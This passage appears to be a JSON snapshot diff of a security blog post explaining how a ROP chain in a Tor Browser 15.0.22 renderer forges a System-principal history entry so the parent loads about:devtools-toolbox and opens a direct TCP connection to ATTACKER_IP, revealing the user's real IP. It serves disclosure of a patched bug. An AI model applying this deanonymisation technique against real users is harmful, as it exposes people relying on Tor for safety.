+          "text": "After having done the stack pivot each ret takes the address of the next gadget from RS. The chain uses gadgets to prepare the x86-64 registers and call native functions already present in libxul. In this way it can create internal Gecko objects that a JavaScript page could never request.",
+          "inlines": [
+            {
+              "text": "After having done the stack pivot each "
+            },
+            {
+              "code": true,
+              "text": "ret"
+            },
+            {
+              "text": " takes the address of the next gadget from "
+            },
+            {
+              "bold": true,
+              "text": "RS"
+            },
+            {
+              "text": ". "
+            },
+            {
+              "bold": true,
+              "text": "The chain uses gadgets to prepare the x86-64 registers and call native functions already present in "
+            },
+            {
+              "bold": true,
+              "code": true,
+              "text": "libxul"
+            },
+            {
+              "bold": true,
+              "text": ". In this way it can create internal Gecko objects that a JavaScript page could never request."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The target is a SessionHistoryInfo, the record used to restore a navigation:",
+          "inlines": [
+            {
+              "text": "The target is a "
+            },
+            {
+              "code": true,
+              "text": "SessionHistoryInfo"
+            },
+            {
+              "text": ", the record used to restore a navigation:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "URI                 = about:devtools-toolbox?type=process&host=ATTACKER_IP&port=9192\nprincipal           = System\nsharedId            = new\nBrowsingContext     = that of the same popup"
+        },
+        {
+          "type": "paragraph",
+          "text": "The System principal is Firefox's internal identity with the highest authority. ROP first saves its original stack pointer, converts the URI and text/html into native strings, obtains an nsIURI, assembles the System principal, and finds its popup's BrowsingContext by following the current global and inner window.",
+          "inlines": [
+            {
+              "text": "The System principal is Firefox's internal identity with the highest authority. ROP first saves its original stack pointer, converts the URI and "
+            },
+            {
+              "code": true,
+              "text": "text/html"
+            },
+            {
+              "text": " into native strings, obtains an "
+            },
+            {
+              "code": true,
+              "text": "nsIURI"
+            },
+            {
+              "text": ", assembles the System principal, and finds its popup's "
+            },
+            {
+              "code": true,
+              "text": "BrowsingContext"
+            },
+            {
+              "text": " by following the current global and inner window."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Each letter is printed with a native write(2) to indicate how far execution got:",
+          "inlines": [
+            {
+              "text": "Each letter is printed with a native "
+            },
+            {
+              "code": true,
+              "text": "write(2)"
+            },
+            {
+              "text": " to indicate how far execution got:"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Marker",
+          "inlines": [
+            {
+              "bold": true,
+              "text": "Marker"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Operation completed before or around the marker",
+          "inlines": [
+            {
+              "bold": true,
+              "text": "Operation completed before or around the marker"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "A",
+          "inlines": [
+            {
+              "text": "A"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The original stack pointer was saved and ROP control was established.",
+          "inlines": [
+            {
+              "text": "The original stack pointer was saved and ROP control was established."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "B",
+          "inlines": [
+            {
+              "text": "B"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The attacker URI bytes were converted to Gecko's native string.",
+          "inlines": [
+            {
+              "text": "The attacker URI bytes were converted to Gecko's native string."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "C",
+          "inlines": [
+            {
+              "text": "C"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The native text/html content type was built.",
+          "inlines": [
+            {
+              "text": "The native "
+            },
+            {
+              "code": true,
+              "text": "text/html"
+            },
+            {
+              "text": " content type was built."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "D",
+          "inlines": [
+            {
+              "text": "D"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "NS_NewURI returned an nsIURI for the privileged DevTools address.",
+          "inlines": [
+            {
+              "code": true,
+              "text": "NS_NewURI"
+            },
+            {
+              "text": " returned an "
+            },
+            {
+              "code": true,
+              "text": "nsIURI"
+            },
+            {
+              "text": " for the privileged DevTools address."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "E",
+          "inlines": [
+            {
+              "text": "E"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The System principal and SessionHistoryInfo were assembled.",
+          "inlines": [
+            {
+              "text": "The System principal and "
+            },
+            {
+              "code": true,
+              "text": "SessionHistoryInfo"
+            },
+            {
+              "text": " were assembled."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "F/G",
+          "inlines": [
+            {
+              "text": "F/G"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The global, inner window and BrowsingContext were followed; the target was copied into the message.",
+          "inlines": [
+            {
+              "text": "The global, inner window and "
+            },
+            {
+              "code": true,
+              "text": "BrowsingContext"
+            },
+            {
+              "text": " were followed; the target was copied into the message."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "H",
+          "inlines": [
+            {
+              "text": "H"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "SendReplaceActiveSessionHistoryEntry returned.",
+          "inlines": [
+            {
+              "code": true,
+              "text": "SendReplaceActiveSessionHistoryEntry"
+            },
+            {
+              "text": " returned."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "I",
+          "inlines": [
+            {
+              "text": "I"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "SendHistoryReload returned.",
+          "inlines": [
+            {
+              "code": true,
+              "text": "SendHistoryReload"
+            },
+            {
+              "text": " returned."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The last two are normal IPDL messages. The first replaces the active popup entry with the prepared record, the second asks the parent process to reload it.",
+          "inlines": [
+            {
+              "text": "The last two are normal IPDL messages. The first replaces the active popup entry with the prepared record, the second asks the parent process to reload it."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The flaw is that the parent treats the message content as state, when part of it represents authority. It rejects javascript:, but accepts the principal and URI supplied for a new sharedId, then only checks that the BrowsingContext exists. Thus, the parent installs the forged entry in its canonical history and reloads about:devtools-toolbox with System principal.",
+          "inlines": [
+            {
+              "text": "The flaw is that the parent treats the message content as state, when part of it represents authority. It rejects "
+            },
+            {
+              "code": true,
+              "text": "javascript:"
+            },
+            {
+              "text": ", but accepts the principal and URI supplied for a new "
+            },
+            {
+              "code": true,
+              "text": "sharedId"
+            },
+            {
+              "text": ", then only checks that the "
+            },
+            {
+              "code": true,
+              "text": "BrowsingContext"
+            },
+            {
+              "text": " exists. Thus, the parent installs the forged entry in its canonical history and reloads "
+            },
+            {
+              "code": true,
+              "text": "about:devtools-toolbox"
+            },
+            {
+              "text": " with System principal."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Before finishing, the chain replaces the dangerous entries in the fake vtable with return gadgets and restores the RSP that it saved at the beginning. The renderer can continue while the message is already being processed by the parent. ROP has not been executed in the parent; it has made the parent perform a legitimate navigation using false authority.",
+          "inlines": [
+            {
+              "text": "Before finishing, the chain replaces the dangerous entries in the fake vtable with return gadgets and restores the RSP that it saved at the beginning. The renderer can continue while the message is already being processed by the parent. "
+            },
+            {
+              "bold": true,
+              "text": "ROP has not been executed in the parent; it has made the parent perform a legitimate navigation using false authority."
+            }
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "Fourth Phase: Revealing the IP",
+          "inlines": [
+            {
+              "text": "Fourth Phase: Revealing the IP"
+            }
+          ],
+          "level": 3
+        },
+        {
+          "type": "paragraph",
+          "text": "The forged URI is also the instruction for the last phase. The about:devtools-toolbox module turns it into a packaged DevTools page, assigns the System principal to its channel, allows scripts and does not force it to load in an ordinary content process. That is why the reload accepted in phase 3 ends in privileged code.",
+          "inlines": [
+            {
+              "text": "The forged URI is also the instruction for the last phase. The "
+            },
+            {
+              "code": true,
+              "text": "about:devtools-toolbox"
+            },
+            {
+              "text": " module turns it into a packaged DevTools page, assigns the System principal to its channel, allows scripts and does not force it to load in an ordinary content process. That is why the reload accepted in phase 3 ends in privileged code."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "When starting, the page directly reads host and port from its URI:",
+          "inlines": [
+            {
+              "text": "When starting, the page directly reads "
+            },
+            {
+              "code": true,
+              "text": "host"
+            },
+            {
+              "text": " and "
+            },
+            {
+              "code": true,
+              "text": "port"
+            },
+            {
+              "text": " from its URI:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "const host = params.get(\"host\");\nconst port = params.get(\"port\");\nif (port)\n  transport = await DevToolsClient.socketConnect({host, port, webSocket});\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "The transport ends up calling nsISocketTransportService.createTransport(). It does not create a content HTTP channel and does not receive the SOCKS configuration used to send web traffic to the Tor daemon. The parent directly establishes the TCP handshake with the attacker's listener",
+          "inlines": [
+            {
+              "text": "The transport ends up calling "
+            },
+            {
+              "code": true,
+              "text": "nsISocketTransportService.createTransport()"
+            },
+            {
+              "text": ". It does not create a content HTTP channel and does not receive the SOCKS configuration used to send web traffic to the Tor daemon. "
+            },
+            {
+              "bold": true,
+              "text": "The parent directly establishes the TCP handshake with the attacker's listener"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "System history -> about:devtools-toolbox\nDevTools -> socketConnect(ATTACKER_IP, 9192)\nparent -> direct TCP socket\nlistener -> accept() -> public source IP address of the connection that bypasses Tor\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "The server does not need to authenticate DevTools or respond to its protocol. When accept() returns the connection, the TCP handshake has already delivered the public source IP address of the connection that bypasses Tor, whether it is the device's direct public IP address or a VPN/NAT address, while the original page requests continue to show a Tor exit address.",
+          "inlines": [
+            {
+              "text": "The server does not need to authenticate DevTools or respond to its protocol. "
+            },
+            {
+              "bold": true,
+              "text": "When "
+            },
+            {
+              "code": true,
+              "text": "accept()"
+            },
+            {
+              "bold": true,
+              "text": " returns the connection, the TCP handshake has already delivered the public source IP address of the connection that bypasses Tor"
+            },
+            {
+              "text": ", whether it is the device's direct public IP address or a VPN/NAT address, while the original page requests continue to show a Tor exit address."
+            }
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "PoC",
+          "inlines": [
+            {
+              "text": "PoC"
+            }
+          ],
+          "level": 2
+        },
+        {
+          "type": "paragraph",
+          "text": "And what would a blog be without its corresponding PoC?",
+          "inlines": [
+            {
+              "text": "And what would a blog be without its corresponding PoC?"
+            }
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "Conclusions",
+          "inlines": [
+            {
+              "text": "Conclusions"
+            }
+          ],
+          "level": 2
+        },
+        {
+          "type": "paragraph",
+          "text": "The whole point of Tor Browser is to hide the user's IP address, so leaking that address undoes the protection that routing through the network provides. The browser is one layer of defense, not a guarantee on its own. For stronger anonymity, pair Tor Browser with hardened setups such as dedicated devices and careful operational habits.",
+          "inlines": [
+            {
+              "text": "The whole point of Tor Browser is to hide the user's IP address, so leaking that address undoes the protection that routing through the network provides. The browser is one layer of defense, not a guarantee on its own. For stronger anonymity, pair Tor Browser with hardened setups such as dedicated devices and careful operational habits."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "And this has been the exploit! It worked for Tor Browser 15.0.22, and it was patched in 15.0.23. I hope you enjoyed reading it as much as I enjoyed debugging it, thank you very much for your attention.",
+          "inlines": [
+            {
+              "text": "And this has been the exploit! It worked for Tor Browser "
+            },
+            {
+              "code": true,
+              "text": "15.0.22"
+            },
+            {
+              "text": ", and it was patched in "
+            },
+            {
+              "code": true,
+              "text": "15.0.23"
+            },
+            {
+              "text": ". I hope you enjoyed reading it as much as I enjoyed debugging it, thank you very much for your attention."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "About Calif",
+          "inlines": [
+            {
+              "text": "About Calif"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "We push offensive security research to its limits, understand what is becoming possible with AI, and use those insights to help our customers defend themselves.",
+          "inlines": [
+            {
+              "text": "We push offensive security research to its limits, understand what is becoming possible with AI, and use those insights to help our customers defend themselves."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Get in touch, and subscribe to our newsletter for more research like this:",
+          "inlines": [
+            {
+              "href": "https://calif.io/contact",
+              "text": "Get in touch"
+            },
+            {
+              "text": ", and subscribe to our newsletter for more research like this:"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Check your inbox to confirm.",
+          "inlines": [
+            {
+              "text": "Check your inbox to confirm."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Related research",
+          "inlines": [
+            {
+              "text": "Related research"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Big Fish: Exploiting a 37-Year-Old Kernel Bug in OpenBSDOctober 16, 2026",
+          "inlines": [
+            {
+              "href": "https://calif.io/research/big-fish",
+              "text": "Big Fish: Exploiting a 37-Year-Old Kernel Bug in OpenBSDOctober 16, 2026"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "← All research",
+          "inlines": [
+            {
+              "href": "https://calif.io/research",
+              "text": "← All research"
+            }
+          ]
+        }
+      ]
+    }
+  },
+  "snapshotAt": "2026-11-27T01:10:27.786581Z",
+  "contentMode": "full"
+}
